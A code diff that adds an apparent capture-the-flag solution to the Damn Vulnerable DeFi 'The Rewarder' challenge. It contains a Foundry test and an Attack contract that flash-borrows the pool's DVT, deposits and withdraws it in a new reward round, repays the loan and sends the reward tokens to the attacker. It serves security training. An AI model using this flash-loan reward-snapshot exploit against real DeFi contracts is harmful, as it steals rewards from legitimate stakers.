@@ -87,8 +87,19 @@ contract TheRewarder is Test {
     function testExploit() public {
         /**
          * EXPLOIT START *
+         * 1. Flashloan
+         * 2. Deposit into rewarder via dvt allowance
+         * 3. Withdraw from rewarder
+         * 4. Return Flashloan via dvt transfer
          */
+        vm.warp(block.timestamp + 5 days);
+        vm.startPrank(attacker);
+        bool newRound = theRewarderPool.isNewRewardsRound();
+        console.log("Time for new round: %s", newRound);
 
+        Attack attack = new Attack(address(flashLoanerPool), address(theRewarderPool), address(dvt), address(theRewarderPool.rewardToken()));
+        attack.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -116,5 +127,46 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract Attack {
+
+    DamnValuableToken immutable i_DVT;
+    RewardToken immutable i_REWARD;
+    address immutable i_FLASHLOAN;
+    address immutable i_REWARDER;
+    address immutable i_OWNER;
+
+    constructor(address flashloan, address rewarder, address dvt, address reward) {
+        i_DVT = DamnValuableToken(dvt);
+        i_FLASHLOAN = flashloan;
+        i_REWARDER = rewarder;
+        i_REWARD = RewardToken(reward);
+        i_OWNER = msg.sender;
+    }
+
+    function attack() external {
+        uint256 loanAmount = i_DVT.balanceOf(i_FLASHLOAN);
+        (bool flashloan, ) = i_FLASHLOAN.call(abi.encodeWithSignature("flashLoan(uint256)", loanAmount));
+        console.log("Flashloan: %s", flashloan);
+    }
+
+    function receiveFlashLoan(uint256 loanAmount) external {
+        (bool approve) = i_DVT.approve(i_REWARDER, loanAmount);
+        console.log("DVT transfer approval: %s", approve);
+
+        (bool deposit, ) = i_REWARDER.call(abi.encodeWithSignature("deposit(uint256)", loanAmount));
+        console.log("Rewarder deposit: %s", deposit);
+
+        (bool withdraw, ) = i_REWARDER.call(abi.encodeWithSignature("withdraw(uint256)", loanAmount));
+        console.log("Rewarder withdraw: %s", withdraw);
+
+        (bool transfer) = i_DVT.transfer(i_FLASHLOAN, loanAmount);
+        console.log("Flashloan return: %s", transfer);
+
+        uint256 rewardTokens = i_REWARD.balanceOf(address(this));
+        (bool reward) = i_REWARD.transfer(i_OWNER, rewardTokens);
+        console.log("Reward transfer to attacker: %s", reward);
     }
 }
